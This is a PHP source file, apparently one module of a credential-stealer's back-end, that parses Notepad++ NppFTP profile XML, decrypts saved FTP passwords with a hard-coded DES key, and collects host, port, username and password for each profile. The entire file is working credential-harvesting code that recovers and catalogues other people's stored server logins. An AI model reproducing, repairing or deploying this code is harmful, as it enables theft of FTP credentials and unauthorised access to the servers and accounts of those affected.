<?php
	class Module_nppftp extends Module_
	{
		function Decrypt($Password, $Key = 'OppFTQ11')
		{
			if (!strlen($Password))
				return '';

			$Password = hex2bin($Password);
			if ($Password === false)
				return '';

			$MDesc = mcrypt_module_open(MCRYPT_DES, '', 'ecb', '');

			if (!$MDesc)
				return '';

			mcrypt_generic_init($MDesc, $Key, $Key);

			$Result = decrypt_cfbblock($MDesc, $Password, $Key);

			mcrypt_generic_deinit($MDesc);
			mcrypt_module_close($MDesc);

			return $Result;
		}

		function ProcessNPP($Data)
		{
			$XML_ = simplexml_load_string($Data);
			if(!$XML_)
				return FALSE;

			$MasterPass = '';
			if(isset($XML_['MasterPass']))
				$MasterPass = Assign_($XML_['MasterPass']);

			//print $XML_['MasterPass'];
			if(!strlen($MasterPass))
			{
				if(isset($XML_->Profiles))
				{
					$Cnt = 0;
					$Exists = isset($XML_->Profiles->Profile[0]['username']);

					while($Exists)
					{
						$Pass = $this->Decrypt(Assign_($XML_->Profiles->Profile[$Cnt]['password']));
						$User = Assign_($XML_->Profiles->Profile[$Cnt]['username']);
						$Host = Assign_($XML_->Profiles->Profile[$Cnt]['hostname']);
						$Port = Assign_($XML_->Profiles->Profile[$Cnt]['port']);
						$Prot = Assign_($XML_->Profiles->Profile[$Cnt]['securityMode']);

						$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == '3'), $Port), $User, $Pass);

						$Exists = isset($XML_->Profiles->Profile[++$Cnt]['username']);
					}
				}
			}

			$XML_= NULL;
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->ProcessNPP( $Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}
